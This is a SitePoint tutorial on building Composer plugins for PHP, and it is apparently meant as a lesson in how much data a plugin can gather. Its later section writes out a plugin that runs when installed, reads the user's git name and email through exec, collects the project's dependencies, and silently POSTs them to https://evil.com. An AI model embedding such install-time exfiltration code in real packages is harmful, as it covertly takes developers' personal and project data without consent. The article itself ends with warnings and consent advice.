>http://www.sitepoint.com/drunk-with-the-power-of-composer-plugins/
Drunk with the Power of Composer Plugins

# Drunk with the Power of Composer Plugins

Composer is the sharpest tool in the toolbox of the modern PHP developer. The days of manual dependency management are in the distant past, and in their place we have wonderful things like Semver. Things that help us sleep at night, because we can update our dependencies without smashing rocks together.

![neanderthal smashing rocks](http://dab1nmslvvntp.cloudfront.net/wp-content/uploads/2016/03/1458601093neanderthal-785x1024.jpg)

Even though we use Composer so frequently, there’s not a lot of shared knowledge about how to extend it. It’s as if it does such a good job in its default state, that extending it isn’t worth the time or effort to do or document. Even the official docs [skirt around the issue](https://getcomposer.org/doc/articles/plugins.md). Probably because nobody is asking for it…

Yet, recent changes have made it much easier to develop Composer plugins. Composer has also recently moved from alpha to beta, in perhaps the most conservative release cycle ever conceived. This thing that makes modern PHP possible in its current form. This cornerstone of professional PHP development. Just moved from alpha to beta.

So, today I thought we would explore the possibilities of Composer plugin development, and create a fresh bit of documentation as we go.

_You can find the code for this plugin at [github.com/assertchris-tutorials/tutorial-composer-plugins](https://github.com/assertchris-tutorials/tutorial-composer-plugins)._

## Getting Started

To begin, we need to create a plugin repository, separate from the application we’ll use it with. Plugins are installed like any regular dependency. Let’s create a new folder with a `composer.json` file:

```
{
    "type": "composer-plugin",
    "name": "sitepoint/plugin",
    "require": {
        "composer-plugin-api": "^1.0"
    }
}
```

All of these things are important! We give this plugin a type of `composer-plugin` or it will never be treated as such. `composer-plugin` dependencies are privy to hooks in the Composer lifecycle, which we’ll tap into.

We name the plugin, so our app can require it as a dependency. You can use whatever you like here, but you’ll need to remember the name for later.

We also need to require the `composer-plugin-api`. The version here is important, because our plugin will be treated as being compatible with a specific version of the plugin API, which may affect things like method signatures.

Next, we need to autoload a plugin class, and tell Composer what it is called:

```
"autoload": {
    "psr-4": {
        "SitePoint\\": "src"
    }
},
"extra": {
    "class": "SitePoint\\Plugin"
}
```

We’ll create a `src` folder, with a `Plugin.php` file. That’s the file Composer is going to load (as the first hook in the Composer lifecycle):

```php
namespace SitePoint;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class Plugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        print "hello world";
    }
}
```

`PluginInterface` requires a public `activate` method, which is called when the plugin is loaded. It’s a good time to verify that the plugin code is working thus far. Now we have to create the app folder, with a `composer.json` file of its own:

```
{
    "name": "sitepoint/app",
    "require": {
        "sitepoint/plugin": "*"
    },
    "repositories": [
        {
            "type": "path",
            "url": "../sitepoint-plugin"
        }
    ],
    "minimum-stability": "dev",
    "prefer-stable": true
}
```

This one is significantly easier than before, and more likely to resemble how people will use your plugin. The best thing would be to release stable versions of your plugin through Packagist, but while you’re developing, this is ok. It tells Composer to require any available version of `sitepoint<span class="token operator">/</span>plugin`, and where to source that dependency from.

Path repositories are a relatively recent addition to Composer, and they automatically manage symlinking of dependencies so you don’t have to. Since we’re requiring an unstable dependency, we tell Composer to drop the minimum stability to `dev`.

_In situations like this, it’s a good idea to also prefer stable dependencies where possible…_

You should now be able to run `composer install` from your app folder, and see the `hello world` message! All without putting any code on [Github](https://github.com) or [Packagist](https://packagist.org).

_I recommend running `rm -rf vendor composer.lock; composer install` during development, as it will reset the application and/or plugin state regularly. Especially when you start messing with installation folders!_

## Exploring Plugin Capabilities

_It’s also a good idea to require `composer<span class="token operator">/</span>composer`, as this will download the interfaces and classes we’re about to work with into the vendor folder._

Most of what you’ll learn about plugins, you can find just by looking through the Composer source code. Alternatively, you can “inspect” the two instances provided to your plugin’s `activate` method. It also helps if you’re using an IDE like [PHPStorm](https://www.jetbrains.com/phpstorm), so you can jump to definitions easily.

For instance, we can inspect `<span class="token variable">$composer</span>-<span class="token operator">></span><span class="token function">getPackage</span>(<span class="token punctuation">)</span>` to see what’s in the root `composer.json` file. We can use `<span class="token variable">$io</span>-<span class="token operator">></span><span class="token function">ask</span>(<span class="token string">"..."</span><span class="token punctuation">)</span>` to ask questions during the installation process.

## Putting These to Use

Let’s build something practical, though perhaps a little diabolical. Let’s make our plugin track users and the dependencies they require. We begin by finding their Git username and email:

```php
public function activate(Composer $composer, IOInterface $io)
{
    exec("git config --global user.name", $name);
    exec("git config --global user.email", $email);

    $payload = [];

    if (count($name) > 0) {
        $payload["name"] = $name[0];
    }

    if (count($email) > 0) {
        $payload["email"] = $email[0];
    }
}
```

Git user names and email addresses are usually stored in global config, which means running `git config --<span class="token keyword">global</span> user.name` from terminal will return them. We can take that a step further, by running them through `exec`, and inspecting the results.

Next, let’s track the name of the application (if one is defined) as well as the dependencies and their versions. We can do the same for the development dependencies, so let’s create a method for both:

```php
private function addDependencies($type, array $dependencies, array $payload)
{
    $payload = array_slice($payload, 0);

    if (count($dependencies) > 0) {
        $payload[$type] = [];
    }

    foreach ($dependencies as $dependency) {
        $name = $dependency->getTarget();
        $version = $dependency->getPrettyConstraint();

        $payload[$type][$name] = $version;
    }

    return $payload;
}
```

We get the name and version constraint for each dependency, and add them to the `<span class="token variable">$payload</span>` array. Calling `array_slice` on the payload array ensures no side-effects for this method, so it can be called any number of times with exactly the same results.

_This is often referred to as a pure function, or an example of immutable variable usage._

Then we call this method with the dependency arrays:

```php
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    $app = $composer->getPackage()->getName();

    if ($app) {
        $payload["app"] = $app;
    }

    $payload = $this->addDependencies(
        "requires",
        $composer->getPackage()->getRequires(),
        $payload
    );

    $payload = $this->addDependencies(
        "dev-requires",
        $composer->getPackage()->getDevRequires(),
        $payload
    );
}
```

Finally, we can send this data somewhere:

```php
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    // ...get project details

    $context = stream_context_create([
        "http" => [
            "method" => "POST",
            "timeout" => 0.5,
            "content" => http_build_query($payload),
        ],
    ]);

    @file_get_contents("https://evil.com", false, $context);
}
```

We could use [Guzzle](http://docs.guzzlephp.org) for this, but `file_get_contents` works just as well. We send a `<span class="token constant">POST</span>` request to `https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>evil.com`, with a serialized payload.

## Be Good

I don’t want this to seem like a recommendation for covert user data gathering. But perhaps it’s useful to know just how much data someone _could_ gather, just by requiring a well-crafted Composer plugin.

You could use the `composer install --no-plugins` option, but many frameworks and content management systems depend on plugins to set themselves up correctly.

A few additional warnings:

1.  If you’re going to use `exec`, filter and validate any data that isn’t hard-coded. Otherwise you’re creating attack vectors for your code.
2.  If you’re sending data anywhere, send it over HTTPS. Otherwise other malicious people can reap the benefits of your malicious data gathering.
3.  Don’t track user data without consent. It’s possible to ask before you take the data, so do that every time! Something like `IOInterface::ask("...")` is just what you need…

Did this article help you? Perhaps you’ve got an idea for a plugin; like a custom installer plugin or a plugin that downloads offline documentation for popular projects. Let us know in the comments below…


# composer, OOPHP, packagist, PHP, php package, plugin, plugin plugin-development